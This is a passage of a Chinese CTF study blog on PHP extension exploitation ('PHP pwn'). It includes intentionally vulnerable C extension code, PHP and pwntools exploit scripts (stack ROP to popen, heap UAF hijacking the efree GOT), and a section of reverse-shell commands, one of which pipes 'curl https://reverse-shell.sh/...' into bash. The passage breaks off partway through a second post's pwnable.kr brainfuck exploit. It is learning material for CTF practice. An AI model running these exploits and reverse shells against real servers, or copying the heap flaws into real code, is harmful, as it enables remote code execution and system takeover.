}\n\n\n/* {{{ PHP_RINIT_FUNCTION\n */\nPHP_RINIT_FUNCTION(my_stack)\n{\n#if defined(ZTS) && defined(COMPILE_DL_MY_STACK)\n\tZEND_TSRMLS_CACHE_UPDATE();\n#endif\n\n\treturn SUCCESS;\n}\n/* }}} */\n\n/* {{{ PHP_MINFO_FUNCTION\n */\nPHP_MINFO_FUNCTION(my_stack)\n{\n\tphp_info_print_table_start();\n\tphp_info_print_table_header(2, \"my_stack support\", \"enabled\");\n\tphp_info_print_table_end();\n}\n/* }}} */\n\n/* {{{ arginfo\n */\n\nZEND_BEGIN_ARG_INFO(arginfo_my_stack_gift, 0)\nZEND_END_ARG_INFO()\n\nZEND_BEGIN_ARG_INFO(arginfo_my_stack_func, 0)\nZEND_ARG_INFO(0, data)\nZEND_END_ARG_INFO()\n/* }}} */\n\n/* {{{ my_stack_functions[]\n */\nstatic const zend_function_entry my_stack_functions[] = {\n\tPHP_FE(my_stack_gift,\t\targinfo_my_stack_gift)\n\tPHP_FE(my_stack_func,\t\targinfo_my_stack_func)\n\tPHP_FE_END\n};\n/* }}} */\n\n/* {{{ my_stack_module_entry\n */\nzend_module_entry my_stack_module_entry = {\n\tSTANDARD_MODULE_HEADER,\n\t\"my_stack\",\t\t\t\t\t/* Extension name */\n\tmy_stack_functions,\t\t\t/* zend_function_entry */\n\tNULL,\t\t\t\t\t\t\t/* PHP_MINIT - Module initialization */\n\tNULL,\t\t\t\t\t\t\t/* PHP_MSHUTDOWN - Module shutdown */\n\tPHP_RINIT(my_stack),\t\t\t/* PHP_RINIT - Request initialization */\n\tNULL,\t\t\t\t\t\t\t/* PHP_RSHUTDOWN - Request shutdown */\n\tPHP_MINFO(my_stack),\t\t\t/* PHP_MINFO - Module info */\n\tPHP_MY_STACK_VERSION,\t\t/* Version */\n\tSTANDARD_MODULE_PROPERTIES\n};\n/* }}} */\n\n#ifdef COMPILE_DL_MY_STACK\n# ifdef ZTS\nZEND_TSRMLS_CACHE_DEFINE()\n# endif\nZEND_GET_MODULE(my_stack)\n#endif\n\n```\n\n\n\n### (2)堆模块\n\nUAF，溢出，doubleFree等漏洞\n\n测试代码，如下即为用php7.3编译的代码，实现四个函数，增删改查\n\n```\nmy_heap_addFunc(18);\nmy_heap_delFunc(0);\nmy_heap_editFunc(0,'aaa');\nmy_heap_getFunc(0);\n```\n\n题目代码：\n\n```c\n/* my_heap extension for PHP */\n\n#ifdef HAVE_CONFIG_H\n# include \"config.h\"\n#endif\n\n#include \"php.h\"\n#include \"ext/standard/info.h\"\n#include \"php_my_heap.h\"\n\n/* For compatibility with older PHP versions */\n#ifndef ZEND_PARSE_PARAMETERS_NONE\n#define ZEND_PARSE_PARAMETERS_NONE() \\\n\tZEND_PARSE_PARAMETERS_START(0, 0) \\\n\tZEND_PARSE_PARAMETERS_END()\n#endif\n\n\n\nstatic char* notelist[1000];\nstatic int count;\n\n\nPHP_FUNCTION(my_heap_gift)\n        {\n        \tchar data[0x10];\n        \tzend_string *retval;\n            ZEND_PARSE_PARAMETERS_NONE();\n            php_printf(\"PHP_HEAP Gift function!---000\\n\");\n\t\t    retval = strpprintf(0, \"Gift_Stack:0x%lx\\nGift_Libc:0x%lx\\nGift_ELF:0x%lx\\n\",&data,&printf,&zif_my_heap_gift);\nRETURN_STR(retval);\n        }\n\n\n\n\nPHP_FUNCTION(my_heap_addFunc)\n        {\n                long size = 10;\n                char* chunk = NULL;\n                //zend_string *retval;\n                php_printf(\"PHP_HEAP Add function!---001\\n\");\n\n                ZEND_PARSE_PARAMETERS_START(1, 1)\n                Z_PARAM_LONG(size)\n                ZEND_PARSE_PARAMETERS_END();\n                chunk = _emalloc(size);\n                php_printf(\"chunk_addr:0x%lx\\n\", chunk);\n                //retval = strpprintf(0, \"chunk_addr:0x%lx\", chunk);\n                if (!chunk)\n                {\n                    php_printf(\"Alloca Error\\n\");\n                    return 0;\n                }\n\n                //HELLO_G(greeting) ++;\n                notelist[count] = chunk;\n                chunk = NULL;\n                count ++;\n        }\n\n\nPHP_FUNCTION(my_heap_delFunc)\n        {\n        \tlong idx = 0;\n            php_printf(\"PHP_HEAP Free function!---002\\n\");\n\n            ZEND_PARSE_PARAMETERS_START(1, 1)\n            Z_PARAM_LONG(idx)\n            ZEND_PARSE_PARAMETERS_END();\n\n            if (notelist[idx])\n            {\n                _efree(notelist[idx]);\n                //notelist[noteChunk->idx] = NULL;\n                php_printf(\"Free Success!\\n\");\n            }\n            else\n            {\n                php_printf(\"You can't free it!There is no chunk!\\n\");\n            }\n        }\n\nPHP_FUNCTION(my_heap_editFunc)\n        {\n        \tlong idx = 0;\n        \tchar* data = \"editTest\";\n        \tsize_t data_len = sizeof(\"editTest\") - 1;\n            php_printf(\"PHP_HEAP Edit function!---003\\n\");\n\n            ZEND_PARSE_PARAMETERS_START(2,2)\n            Z_PARAM_LONG(idx)\n            Z_PARAM_STRING(data, data_len)\n            ZEND_PARSE_PARAMETERS_END();\n\n            if (notelist[idx])\n            {\n                memcpy(notelist[idx],data,data_len);\n                php_printf(\"Edit Success!\\n\");\n            }\n            else\n            {\n                php_printf(\"You can't free it!There is no chunk!\\n\");\n            }\n        }\n\n\nPHP_FUNCTION(my_heap_getFunc)\n        {\n        \tlong idx = 0;\n        \tzend_string *retval;\n            ZEND_PARSE_PARAMETERS_START(1, 1)\n            Z_PARAM_LONG(idx)\n            ZEND_PARSE_PARAMETERS_END();\n\n            php_printf(\"PHP_HEAP Show function!---004\\n\");\n            if(notelist[idx]){\n            \tretval = strpprintf(0, \"Content:%s\\n\",notelist[idx]);\n                php_printf(\"Content:%s\\n\",notelist[idx]);\n                php_printf(\"Show Success!\\n\");\n                RETURN_STR(retval);\n            }\n\n        }\n\n\n/* }}}*/\n\n\n\n/* {{{ PHP_RINIT_FUNCTION\n */\nPHP_RINIT_FUNCTION(my_heap)\n        {\n#if defined(ZTS) && defined(COMPILE_DL_MY_HEAP)\n                ZEND_TSRMLS_CACHE_UPDATE();\n#endif\n\n                return SUCCESS;\n        }\n/* }}} */\n\n/* {{{ PHP_MINFO_FUNCTION\n */\nPHP_MINFO_FUNCTION(my_heap)\n        {\n        php_info_print_table_start();\n        php_info_print_table_header(2, \"my_heap support\", \"enabled\");\n        php_info_print_table_end();\n        }\n/* }}} */\n\n/* {{{ arginfo\n */\nZEND_BEGIN_ARG_INFO(arginfo_my_heap_gift, 0)\nZEND_END_ARG_INFO()\n\n\nZEND_BEGIN_ARG_INFO(arginfo_my_heap_addFunc, 0)\nZEND_ARG_INFO(0, addSize)\nZEND_END_ARG_INFO()\n\n\nZEND_BEGIN_ARG_INFO(arginfo_my_heap_editFunc, 0)\nZEND_ARG_INFO(0, editIdx)\nZEND_ARG_INFO(0, editData)\nZEND_END_ARG_INFO()\n\n\nZEND_BEGIN_ARG_INFO(arginfo_my_heap_delFunc, 0)\nZEND_ARG_INFO(0, delIdx)\nZEND_END_ARG_INFO()\n\nZEND_BEGIN_ARG_INFO(arginfo_my_heap_getFunc, 0)\nZEND_ARG_INFO(0, showIdx)\nZEND_END_ARG_INFO()\n\n/* }}} */\n\n/* {{{ my_heap_functions[]\n */\n        static const zend_function_entry my_heap_functions[] = {\n        \t\tPHP_FE(my_heap_gift,\t\targinfo_my_heap_gift)\n                PHP_FE(my_heap_addFunc,\t\targinfo_my_heap_addFunc)\n                PHP_FE(my_heap_delFunc,\t\targinfo_my_heap_delFunc)\n                PHP_FE(my_heap_editFunc,\t\targinfo_my_heap_editFunc)\n                PHP_FE(my_heap_getFunc,\t\targinfo_my_heap_getFunc)\n                PHP_FE_END\n        };\n/* }}} */\n\n/* {{{ my_heap_module_entry\n */\n        zend_module_entry my_heap_module_entry = {\n                STANDARD_MODULE_HEADER,\n                \"my_heap\",\t\t\t\t\t/* Extension name */\n                my_heap_functions,\t\t\t/* zend_function_entry */\n                NULL,\t\t\t\t\t\t\t/* PHP_MINIT - Module initialization */\n                NULL,\t\t\t\t\t\t\t/* PHP_MSHUTDOWN - Module shutdown */\n                PHP_RINIT(my_heap),\t\t\t/* PHP_RINIT - Request initialization */\n                NULL,\t\t\t\t\t\t\t/* PHP_RSHUTDOWN - Request shutdown */\n                PHP_MINFO(my_heap),\t\t\t/* PHP_MINFO - Module info */\n                PHP_MY_HEAP_VERSION,\t\t/* Version */\n                STANDARD_MODULE_PROPERTIES\n        };\n/* }}} */\n\n#ifdef COMPILE_DL_MY_HEAP\n# ifdef ZTS\nZEND_TSRMLS_CACHE_DEFINE()\n# endif\nZEND_GET_MODULE(my_heap)\n#endif\n\n```\n\n\n\n\n\n# 三、漏洞利用\n\n一般而言，php_pwn都先看看php.ini，哪些函数被禁了，搜索`disable_functions`\n\n![image-20220212202639753](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202122026827.png)\n\n当没有禁止include函数、ob_start函数、ob_get_contents函数、ob_end_flush函数时，就可以来调用从而直接获取地址。\n\n## 1.EXP模板\n\n先来几个常用的函数模板，用来交互\n\n```php\n<?php\n\nfunction u64($val) {\n   $s = bin2hex($val);\n   $len = strlen($s);\n   $ans = \"0x\";\n   for ($i=$len-2;$i>=0;$i-=2) {\n      $ans = $ans . substr($s,$i,2);\n   }\n   return intval($ans,16);\n}\n\n\nfunction p64($i, $x = 8) {\n    $re = \"\";\n    for($j = 0;$j < $x;$j++) {\n        $re .= chr($i & 0xff);\n        $i >>= 8;\n    }\n    return $re;\n}\n\n\n//在可以调用include函数、ob_start函数、ob_get_contents函数、ob_end_flush函数时\n//一般用在可以直接写php代码的时候\nfunction leakaddr($buffer){\n    global $libc,$mbase;\n    $p = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/lib\\/x86_64-linux-gnu\\/libc-2.27.so/';\n    //$p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/usr\\/lib\\/php\\/20170718\\/hackphp.so/';\n    $p_local = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/www\\/server\\/php\\/73\\/lib\\/php\\/extensions\\/no-debug-non-zts-20180731\\/my_heap.so/';\n    preg_match_all($p, $buffer, $libc);\n    //preg_match_all($p1, $buffer, $mbase);\n    preg_match_all($p_local, $buffer, $mbase);\n    return \"\";\n}\nob_start(\"leakaddr\");\ninclude(\"/proc/self/maps\");\n$buffer = ob_get_contents();\nob_end_flush();\nleakaddr($buffer);\n$libc_base=hexdec($libc[1][0]);\n$mod_base=hexdec($mbase[1][0]);\n\n\n\n//字符串操作\n$pad_str = str_pad(string_var,length,pad_string,pad_type);//填充，(pad_type参数可选)\n$sub_str = substr(string,idx,length);//获取子字符串\n$str = str_repeat('B', (0x100));\n//获取格式化输出字符串\necho sprintf(\"0x%lx\",$Libc_addr);\n//字符串拼接\n$str = $a.$b;\n//单个字符\n$str = \"\\x00\";//必须是\"\"双引号的，不能是''单引号\n\n?>\n\n```\n\n并且以下给出的exp都是基于上面的测试用例\n\n\n\n## 2.格式化字符串\n\n\n\n\n\n\n\n\n\n## 3.栈溢出\n\n一般都能够通过读取`/proc/self/maps`来泄露地址\n\n没有canary的时候，单纯栈溢出的时候，一般有以下几种方法\n\n### (1)利用poepn反弹shell\n\n```python\nfrom pwn import *\n\ncontext.arch = \"amd64\"\n\ndef create_php(buf):\n    with open(\"pwn.php\", 'w+') as pf:\n        pf.write('''<?php\nmy_stack_func(urldecode(\"%s\"));\n?>'''%urlencode(buf))\n\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n\n\n#CLI:\nstack_addr = 0x7fffffffa1c0\n\n#GDB:\n#stack_addr = 0x7fffffffa1a0\n\n#WEB:\n#stack_addr = 0x7fffffffbee0\n\nELF_base = 0x7ffff12efd2a - 0xd2a\n\nstack_offset = 0xb0 + 0x8\nLibc_base = 0x7ffff47daf70 - libc.sym['printf']\n\npop_rdi_ret = Libc_base + 0x00000000000215bf\npop_rsi_ret = Libc_base + 0x0000000000023eea\npopen_addr = Libc_base + libc.sym['popen']\n\ncommand = '/bin/bash -c \"/bin/bash -i >&/dev/tcp/127.0.0.1/6666 0>&1\"'\n\n\nlayout = [\n    'a'*stack_offset,\n    pop_rdi_ret,\n    stack_addr+stack_offset+0x30+0x10,\n    pop_rsi_ret,\n    stack_addr+stack_offset+0x28,\n    popen_addr,\n    'r'+'\\x00'*7,\n    'a'*0x10,\n    command.ljust(0x60, '\\x00'),\n    \"a\"*0x8\n]\nbuf = flat(layout)\n\ncreate_php(buf)\n```\n\n以上代码生成之后，直接php pwn.php运行或者调试即可。\n\n需要注意的是，WEB和CLI的栈地址有点不太一样，另外在本地运行的时候，直接运行php和调试php也有点不太一样\n\n![image-20220212135202658](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121352773.png)\n\n\n\n![image-20220212134318923](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121343134.png)\n\n参照[WEBPWN入门级调试讲解 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/204404)\n\n\n\n#### 例题一：2020De1CTF-mixture\n\n参考\n\n[WebPwn：php-pwn学习 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/235237#h3-4)\n\n[De1CTF 2020 Web+Pwn mixture | Clang裁缝店 (xuanxuanblingbling.github.io)](https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/05/mixture/)\n\n\n\n\n\n### (2)rop链构造调用`mprotect`函数执行shellcode\n\n\n\n\n\n\n\n## 4.堆方面\n\n### 堆机制：\n\n首先简单介绍一下内存机制，使用`_emalloc和_efree`进行内存分配和释放，类似不加任何保护的slub/slab机制，存在FD指针可以实现劫持之后任意分配，并且分配的大小规格如下\n\n```\n//宏定义：第一列表示序号（称之为bin_num），第二列表示每个small内存的大小（字节数）；\n//第四列表示每次获取多少个page；第三列表示将page分割为多少个大小为第一列的small内存；\n#define ZEND_MM_BINS_INFO(_, x, y) \\\n    _( 0,    8,  512, 1, x, y) \\\n    _( 1,   16,  256, 1, x, y) \\\n    _( 2,   24,  170, 1, x, y) \\\n    _( 3,   32,  128, 1, x, y) \\\n    _( 4,   40,  102, 1, x, y) \\\n    _( 5,   48,   85, 1, x, y) \\\n    _( 6,   56,   73, 1, x, y) \\\n    _( 7,   64,   64, 1, x, y) \\\n    _( 8,   80,   51, 1, x, y) \\\n    _( 9,   96,   42, 1, x, y) \\\n    _(10,  112,   36, 1, x, y) \\\n    _(11,  128,   32, 1, x, y) \\\n    _(12,  160,   25, 1, x, y) \\\n    _(13,  192,   21, 1, x, y) \\\n    _(14,  224,   18, 1, x, y) \\\n    _(15,  256,   16, 1, x, y) \\\n    _(16,  320,   64, 5, x, y) \\\n    _(17,  384,   32, 3, x, y) \\\n    _(18,  448,    9, 1, x, y) \\\n    _(19,  512,    8, 1, x, y) \\\n    _(20,  640,   32, 5, x, y) \\\n    _(21,  768,   16, 3, x, y) \\\n    _(22,  896,    9, 2, x, y) \\\n    _(23, 1024,    8, 2, x, y) \\\n    _(24, 1280,   16, 5, x, y) \\\n    _(25, 1536,    8, 3, x, y) \\\n    _(26, 1792,   16, 7, x, y) \\\n    _(27, 2048,    8, 4, x, y) \\\n    _(28, 2560,    8, 5, x, y) \\\n    _(29, 3072,    4, 3, x, y)\n \n#endif /* ZEND_ALLOC_SIZES_H */\n```\n\n当超过3K时，如下分配\n\nhuge内存：针对大于2M-4K的分配请求，直接调用mmap分配；\n\nlarge内存：针对小于2M-4K，大于3K的分配请求，在chunk上查找满足条件的若干个连续page；\n\n参考：[【PHP7源码分析】PHP内存管理 - SegmentFault 思否](https://segmentfault.com/a/1190000014764790)\n\n并且不存在我们在glibc中常见的hook函数，所以通常getshell的做法一般两种：\n\n**劫持efree_got**或者**劫持某些结构体的函数指针**\n\n### (1)劫持efree_got\n\n不过这个需要`.so`拓展模块不能为Full RELRO，得能修改其中的got表，然后还得在该拓展模块中有调用`_efree`函数才行，相当于就是`ret2Got`。得泄露该`.so`拓展模块的地址才行。\n\n自定义题目的exp如下\n\n```php\n<?php\n\nfunction u64($val) {\n   $s = bin2hex($val);\n   $len = strlen($s);\n   $ans = \"0x\";\n   for ($i=$len-2;$i>=0;$i-=2) {\n      $ans = $ans . substr($s,$i,2);\n   }\n   return intval($ans,16);\n}\n\n\nfunction p64($i, $x = 8) {\n    $re = \"\";\n    for($j = 0;$j < $x;$j++) {\n        $re .= chr($i & 0xff);\n        $i >>= 8;\n    }\n    return $re;\n}\n\nfunction leakaddr($buffer){\n    global $libc,$mbase;\n    $p = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/lib\\/x86_64-linux-gnu\\/libc-2.27.so/';\n    //$p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/usr\\/lib\\/php\\/20170718\\/hackphp.so/';\n    $p_local = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/www\\/server\\/php\\/73\\/lib\\/php\\/extensions\\/no-debug-non-zts-20180731\\/my_heap.so/';\n    preg_match_all($p, $buffer, $libc);\n    //preg_match_all($p1, $buffer, $mbase);\n    preg_match_all($p_local, $buffer, $mbase);\n    return \"\";\n}\n\n$_efree_got = 0x202068;\n$system_addr = 0x4f550;\n\n\nob_start(\"leakaddr\");\ninclude(\"/proc/self/maps\");\n$buffer = ob_get_contents();\nob_end_flush();\nleakaddr($buffer);\n$libc_base=hexdec($libc[1][0]);\n$mod_base=hexdec($mbase[1][0]);\n\nmy_heap_addFunc(0x10);\nmy_heap_delFunc(0);\nmy_heap_editFunc(0,p64($mod_base+$_efree_got));\nmy_heap_addFunc(0x10);\nmy_heap_editFunc(1,\"cat flag\\x00\");\nmy_heap_addFunc(0x10);\nmy_heap_editFunc(2,p64($libc_base+$system_addr));\nmy_heap_delFunc(1);\n?>\n```\n\n\n\n### (2)劫持get_method函数指针\n\n简单来说，就是劫持函数指针`zend_object->zval->zend_object_handlers->get_method`\n\n#### 原理如下：\n\n##### ①zend_object\n\n当定义声明一个class对象时\n\n```\nclass Lucky{\n\tpublic    $a0, $a1;\n}\n\n$lucky = new Lucky();\n$lucky->a1 = function ($x) { };\n```\n\n当在php中声明Lucky这个class对象时，会自动声明一个对应大小`zend_object`结构\n\n```c\n//7.3/src/Zend/zend_types.h 大小56\nstruct _zend_object {\n    zend_refcounted_h gc;\n    uint32_t          handle; // TODO: may be removed ???\n    zend_class_entry *ce;\n    const zend_object_handlers *handlers;\n    HashTable        *properties;\n    zval              properties_table[1];\n};\n```\n\n正常来说，创建class对象都会有成员，但是在php中其实也可以声明没有成员的class对象，那么此时该class对应的`zend_object`的大小即为56-8=48。所以class对象中的成员越多，其`zend_object`结构的大小就越大。\n\n##### ②zval\n\n而每一个成员在内存中实际反应的就是`zval`结构体\n\n```c\n//7.3/src/Zend/zend_types.h  大小0x10\nstruct _zval_struct {\n\tzend_value        value;\t\t\t/* value */\n\tunion {\n\t\tstruct {\n\t\t\tZEND_ENDIAN_LOHI_3(\n\t\t\t\tzend_uchar    type,\t\t\t/* active type */\n\t\t\t\tzend_uchar    type_flags,\n\t\t\t\tunion {\n\t\t\t\t\tuint16_t  call_info;    /* call info for EX(This) */\n\t\t\t\t\tuint16_t  extra;        /* not further specified */\n\t\t\t\t} u)\n\t\t} v;\n\t\tuint32_t type_info;\n\t} u1;\n\tunion {\n\t\tuint32_t     next;                 /* hash collision chain */\n\t\tuint32_t     cache_slot;           /* cache slot (for RECV_INIT) */\n\t\tuint32_t     opline_num;           /* opline number (for FAST_CALL) */\n\t\tuint32_t     lineno;               /* line number (for ast nodes) */\n\t\tuint32_t     num_args;             /* arguments number for EX(This) */\n\t\tuint32_t     fe_pos;               /* foreach position */\n\t\tuint32_t     fe_iter_idx;          /* foreach iterator index */\n\t\tuint32_t     access_flags;         /* class constant access flags */\n\t\tuint32_t     property_guard;       /* single property guard */\n\t\tuint32_t     constant_flags;       /* constant flags */\n\t\tuint32_t     extra;                /* not further specified */\n\t} u2;\n};\n```\n\n所以class对象的`zend_object`结构的大小公式为\n\n```\n48 + amount_of_member*0x10\n```\n\n比如上述的lucky对象的`zend_object`结构的大小即为`48+0x10*2=0x50`\n\n##### ③zend_object_handlers\n\n而每个zval结构体中的value值是一个指针，当该成员为字符串时，那么其为一个`zend_string`结构体指针\n\n```c\n//7.3/src/Zend/zend_types.h\nstruct _zend_string {\n\tzend_refcounted_h gc;\n\tzend_ulong        h;                /* hash value */\n\tsize_t            len;\n\tchar              val[1];\n};\n```\n\n当该成员为函数时，其为一个`zend_object_handlers`指针\n\n```c\n//7.3/src/Zend/zend_object_handlers.h\nstruct _zend_object_handlers {\n\t/* offset of real object header (usually zero) */\n\tint\t\t\t\t\t\t\t\t\t\toffset;\n\t/* general object functions */\n\tzend_object_free_obj_t\t\t\t\t\tfree_obj;\n\tzend_object_dtor_obj_t\t\t\t\t\tdtor_obj;\n\tzend_object_clone_obj_t\t\t\t\t\tclone_obj;\n\t/* individual object functions */\n\tzend_object_read_property_t\t\t\t\tread_property;\n\tzend_object_write_property_t\t\t\twrite_property;\n\tzend_object_read_dimension_t\t\t\tread_dimension;\n\tzend_object_write_dimension_t\t\t\twrite_dimension;\n\tzend_object_get_property_ptr_ptr_t\t\tget_property_ptr_ptr;\n\tzend_object_get_t\t\t\t\t\t\tget;\n\tzend_object_set_t\t\t\t\t\t\tset;\n\tzend_object_has_property_t\t\t\t\thas_property;\n\tzend_object_unset_property_t\t\t\tunset_property;\n\tzend_object_has_dimension_t\t\t\t\thas_dimension;\n\tzend_object_unset_dimension_t\t\t\tunset_dimension;\n\tzend_object_get_properties_t\t\t\tget_properties;\n\tzend_object_get_method_t\t\t\t\tget_method;\n\tzend_object_call_method_t\t\t\t\tcall_method;\n\tzend_object_get_constructor_t\t\t\tget_constructor;\n\tzend_object_get_class_name_t\t\t\tget_class_name;\n\tzend_object_compare_t\t\t\t\t\tcompare_objects;\n\tzend_object_cast_t\t\t\t\t\t\tcast_object;\n\tzend_object_count_elements_t\t\t\tcount_elements;\n\tzend_object_get_debug_info_t\t\t\tget_debug_info;\n\tzend_object_get_closure_t\t\t\t\tget_closure;\n\tzend_object_get_gc_t\t\t\t\t\tget_gc;\n\tzend_object_do_operation_t\t\t\t\tdo_operation;\n\tzend_object_compare_zvals_t\t\t\t\tcompare;\n};\n```\n\n同样的，也对应有其他的变量类型，由zval中的type来决定，type值的不同代表不同的类型，比如string为6，函数object为8\n\n```c\n//src/Zend/zend_types.h\n/* regular data types */\n#define IS_UNDEF\t\t\t\t\t0\n#define IS_NULL\t\t\t\t\t\t1\n#define IS_FALSE\t\t\t\t\t2\n#define IS_TRUE\t\t\t\t\t\t3\n#define IS_LONG\t\t\t\t\t\t4\n#define IS_DOUBLE\t\t\t\t\t5\n#define IS_STRING\t\t\t\t\t6\n#define IS_ARRAY\t\t\t\t\t7\n#define IS_OBJECT\t\t\t\t\t8\n#define IS_RESOURCE\t\t\t\t\t9\n#define IS_REFERENCE\t\t\t\t10\n\n/* constant expressions */\n#define IS_CONSTANT_AST\t\t\t\t11\n\n/* internal types */\n#define IS_INDIRECT             \t13\n#define IS_PTR\t\t\t\t\t\t14\n#define _IS_ERROR\t\t\t\t\t15\n\n/* fake types used only for type hinting (Z_TYPE(zv) can not use them) */\n#define _IS_BOOL\t\t\t\t\t16\n#define IS_CALLABLE\t\t\t\t\t17\n#define IS_ITERABLE\t\t\t\t\t18\n#define IS_VOID\t\t\t\t\t\t19\n#define _IS_NUMBER\t\t\t\t\t20\n```\n\n汇总一下，就是创建一个class类，然后劫持其函数成员创建的`zval`结构体中的`zend_object_handlers`指针，使其指向我们可控的区域，然后在对应偏移处修改`get_method`指针，使其指向可以执行系统命令的函数，从而来反弹shell。\n\n或者说直接劫持函数成员创建的`zval`结构体中的`zend_object_handlers`指向的内存区域中的`get_method`指针，也是能起到一样的作用。\n\n#### 绕过点\n\n不过还是需要绕过一些保护的，调用`get_method`函数指针貌似还是需要绕过一些东西的，这里不知道具体的原理，不过修改点还是可以说明的\n\n##### ①write_dimension\n\n这个需要修改的，常见的如下，需要修改最低的为0x1\n\n![image-20220216190812859](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161908211.png)\n\n相对应的修改如下\n\n![image-20220216190925728](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161909956.png)\n\n相关检测的代码如下\n\n![image-20220216194142467](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161941846.png)\n\n\n\n##### ②get_method的选择\n\n由于调用该函数指针时，传进来的rdi参数并非是我们的C语言上的字符串类型的指针，而貌似是一个类似`zend_string`的指针，类似如下\n\n![image-20220216193001312](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161930594.png)\n\n所以不能使用常规意义`system`或者`popen`函数等，需要调用php中的相关内置的函数来对参数进行解析再执行。一般选择的是php程序中的`php_exec`函数下面的函数代码，下图红框所示\n\n![image-20220216191438382](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161914467.png)\n\n同样的，以上的结构体在堆中通常也可以用来泄露地址\n\n例题就是2021WMCTF checkin\n\n[2021WMCTF_checkin学习PHP PWN - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/253189#h2-4)\n\n[PHP pwn入门1 - 格式化字符串漏洞 - HackMD](https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/Sy7hS9bBS?type=view)\n\n# 四、反弹shell\n\n常见的反弹shell大概以下两种方式\n\n## 1.popen直接反弹\n\n这个只需要执行命令，其中`127.0.0.1/6666`即设置为自己攻击机的ip和端口\n\n```c\npopen('/bin/bash -c \"/bin/bash -i >&/dev/tcp/127.0.0.1/6666 0>&1\"');\n```\n\n常见system函数不好使用，php中不好整的时候\n\n## 2.使用中转站反弹\n\n[GitHub - lukechilds/reverse-shell: Reverse Shell as a Service](https://github.com/lukechilds/reverse-shell)\n\n执行命令，其中`192.168.0.69:1337`也是设置为自己攻击机的ip和端口\n\n```\nsystem(\"curl https://reverse-shell.sh/192.168.0.69:1337|bash\\x00\");\n```\n\n相当于在一个服务器`https://reverse-shell.sh`进行中转\n\n\n\n# 五、调试技巧\n\n## 1.安装对应版本调试\n\n这个就不多说了，在做题的时候，了解到php版本，然后本机安装对应版本的php，之后在php.ini中添加该模块调试即可\n\n## 2.gdbserver调试\n\n有些题目会给现成的docker环境，所以可以直接在里面使用gdbserver调试，但是有点问题就是，调试的时候好像没办法使用`run`命令来运行php文件，而直接调试`php pwn.php`的话，开始的时候相应的.so模块不会被加载进入，没办法下断点。\n\n那么可以先将本地的ASLR关闭，这样docker中的ASLR也是关闭状态\n\n然后`gdbserver 127.0.0.1:6666 php`，宿主机`target remote:6666;c`远程加载运行起来，找到对应`.so`模块的加载地址`so_addr`\n\n之后再`gdbserver 127.0.0.1:6666 php pwn.php`，宿主机远程加载，使用`add-symbol-file file.so so_addr`从而加载进符号表，然后即可下断点调试了。\n","tags":["PHP_PWN"],"categories":["PWN","PHP_PWN"]},{"title":"解释器PWN","url":"/2022/02/09/解释器PWN/","content":"\n\n\n# 前言\n\n记录一下解释器类型的PWN题\n\n参照：[解释器类型的Pwn题目总结 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/208940#h2-2)\n\n# 一、pwnable_bf\n\n[`brainfuck`语言](https://zh.wikipedia.org/wiki/Brainfuck)的解释器，其中指针p指向bss段上的tape\n\n![image-20220209105933118](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091059160.png)\n\n参照：[Brain fuck-pwnable.kr三种思路详解 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/216749.html)\n\n其中各个分支（符号代表）的功能，可见下表：（部分来源于[TaQini](https://blog.csdn.net/SmalOSnail/article/details/53679546#commentsedit)）\n\n| 操作 |    含义     |      解释      |\n| :--: | :---------: | :------------: |\n|  >   |   p += 1    |     p值加1     |\n|  <   |   p -= 1    |     p值减1     |\n|  +   |  (*p) += 1  | p值指向的值加1 |\n|  -   |  (*p) -= 1  | p值指向的值减1 |\n|  .   | putchar(*p) |      输出      |\n|  ,   | getchar(*p) |      输入      |\n\n简单来说就是：`,.`分别控制输入输出；`<>`控制指针p的取值加减；`+-`控制指针p指向的内存上的值的加减。\n\n所以这里就很明显，由于没有对p做限制，所以我们可以控制指针p来移动到一个范围内的任意地方\n\n![image-20220209110158154](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091101187.png)\n\n最多移动1024次，也就是在如下范围处\n\n```\n&tape ± 1024\n```\n\n又由于tape在bss段上，距离Got表比较近，并且实际上在IDA中查看也确实如此，那么之后我们就可以借助`,`来输出got表中内容，泄露地址，然后修改putchar的got表，直接跳转one_gadget即可。\n\n```python\n#coding:utf-8\nfrom pwn import *\ncontext.log_level = 'debug'\nelf = ELF(\"./bf\")\nlibc = ELF(\"./libc.so.6\")\n\n\nglobal p\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\n# address\ntape_addr = 0x0804A0A0\nputchar_addr = 0x0804A030\n# build payload\npayload = '' \npayload += '<' * (tape_addr - putchar_addr) # move to putchar address(0x0804A030)\npayload += '.' # load putchar into plt (for the time to use putchar)\npayload += '.>' * 0x4 # load putchar real address\npayload += '<' * 0x4 + ',>' * 0x4 # overload putchar\npayload += '.' # getshell\nlog.info(\"start send\")\np = 